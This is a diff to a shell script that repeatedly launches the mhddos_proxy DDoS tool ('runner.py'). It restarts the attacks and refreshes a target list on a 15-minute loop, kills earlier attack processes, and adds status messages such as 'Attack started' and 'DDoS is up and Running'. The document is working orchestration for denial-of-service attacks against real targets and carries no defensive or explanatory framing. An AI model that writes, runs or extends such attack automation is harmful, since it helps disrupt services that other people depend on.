@@ -27,7 +27,8 @@ proxy_interval="1200"
 proxy_interval="-p $proxy_interval"
 
 #Just in case kill previous copy of mhddos_proxy
-pkill -f start.py; pkill -f runner.py
+pkill -f runner.py
+pkill -f ./start.py
 
 # Restart attacks and update targets list every 15 minutes (by default)
 while true
@@ -60,9 +61,13 @@ do
             echo $cmd_line $proxy_interval $threads $rpc
             cd ~/mhddos_proxy
             python3 runner.py --debug $cmd_line $proxy_interval $threads $rpc&
+            echo -e "Attack started. Wait a few minutes for output"
    done
-echo -e "#####################################\n"
+echo -e "\nDDoS is up and Running, next update of targets list in $restart_interval\nSleeping\n"
 sleep $restart_interval
-echo -e "RESTARTING\n"
-pkill -f start.py; pkill -f runner.py
+clear
+ echo -e "\nRESTARTING\nKilling old processes..."
+ pkill -f runner.py
+ pkill -f ./start.py
+ echo -e "\nOld processes have been killed - starting new ones"
 done
